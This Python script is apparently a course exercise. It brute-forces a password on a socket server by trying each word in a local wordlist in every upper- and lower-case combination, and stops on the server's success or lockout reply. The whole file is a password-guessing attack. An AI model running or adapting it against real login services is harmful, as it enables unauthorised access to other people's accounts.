import argparse
import itertools
import sys
import socket
import string


def password_gen(chars):
    for r in range(1, len(chars)):
        for item in itertools.product(chars, repeat=r):
            yield "".join(item)


def crack(hostname, port, passwords):
    with socket.socket() as sock:
        sock.connect((hostname, port))
        for p in passwords:
            for pc in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in p))):
                sock.send(pc.encode())
                res = sock.recv(1024)
                if res.decode() == "Connection success!":
                    return pc
                elif res.decode() == "Too many attempts":
                    return False


def read_words():
    with open('passwords.txt') as f:
        return f.read().splitlines()


def main():
    parser = argparse.ArgumentParser(description="Program that cracks passwords")
    parser.add_argument("hostname", type=str)
    parser.add_argument("port", type=int)
    args = parser.parse_args(sys.argv[1:])
    passwords = read_words()
    if args.hostname and args.port:
        print(crack(args.hostname, args.port, passwords))
    else:
        print("Incorrect parameters")


if __name__ == '__main__':
    main()
